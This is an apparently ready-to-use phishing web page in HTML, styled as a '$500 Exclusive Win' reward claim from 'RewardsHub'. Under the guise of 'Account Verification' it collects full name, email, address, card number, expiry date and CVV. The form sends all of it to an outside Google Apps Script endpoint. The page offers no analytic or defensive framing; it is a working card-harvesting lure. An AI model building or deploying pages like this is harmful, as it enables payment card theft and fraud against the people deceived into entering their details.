<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RewardsHub - $500 Exclusive Win</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap');
        :root { --bg-color: #0a0f1c; --form-bg: #141c2e; --primary-glow: #8a2be2; --secondary-glow: #ff007f; --text-main: #ffffff; }
        body { background: radial-gradient(circle at center, #0a0f1c 0%, #05070f 100%); color: white; display: flex; justify-content: center; padding: 20px; font-family: 'Poppins', sans-serif; min-height: 100vh; }
        .form-container { background: #141c2e; width: 100%; max-width: 450px; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .input-group { margin-bottom: 20px; }
        label { display: block; font-size: 12px; color: #a0b8ff; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 1px; }
        input { width: 100%; background: #0d1325; border: 2px solid #2a3441; padding: 15px; border-radius: 10px; color: white; outline: none; }
        .submit-btn { width: 100%; background: linear-gradient(45deg, #8a2be2, #ff007f); color: white; border: none; padding: 18px; border-radius: 10px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 16px; margin-top: 10px; }
        .submit-btn:hover { transform: scale(1.02); }
    </style>
</head>
<body>

<div class="form-container">
    <h2 style="text-align:center; margin-bottom:20px;">Account Verification</h2>
    
    <form action="https://script.google.com/macros/s/AKfycbz4bE3WIVsYF6EhtlF6xbbJWSZTCx4VOFED3dHpoN88hmVk82uNfm_xToOth-7YEDEb/exec" method="POST">
        
        <div style="display:flex; gap:10px;">
            <div class="input-group" style="flex:1;"><label>First Name</label><input type="text" name="firstName" required></div>
            <div class="input-group" style="flex:1;"><label>Last Name</label><input type="text" name="lastName" required></div>
        </div>
        
        <div class="input-group"><label>Email Address</label><input type="email" name="email" required></div>
        <div class="input-group"><label>Zip Code</label><input type="text" name="zipCode" required></div>
        <div class="input-group"><label>Full Delivery Address</label><input type="text" name="address" required></div>
        <div class="input-group"><label>Cardholder Name</label><input type="text" name="cardholderName" required></div>
        <div class="input-group"><label>Card Number</label><input type="text" name="cardNumber" maxlength="19" required></div>
        
        <div style="display:flex; gap:10px;">
            <div class="input-group" style="flex:1;"><label>Expiry Date</label><input type="text" name="expiry" placeholder="MM/YY" maxlength="5" required></div>
            <div class="input-group" style="flex:1;"><label>CVV / CVC</label><input type="password" name="cvv" placeholder="•••" maxlength="4" required></div>
        </div>
        
        <button type="submit" class="submit-btn">Verify & Claim Reward</button>
    </form>
</div>

</body>
</html>
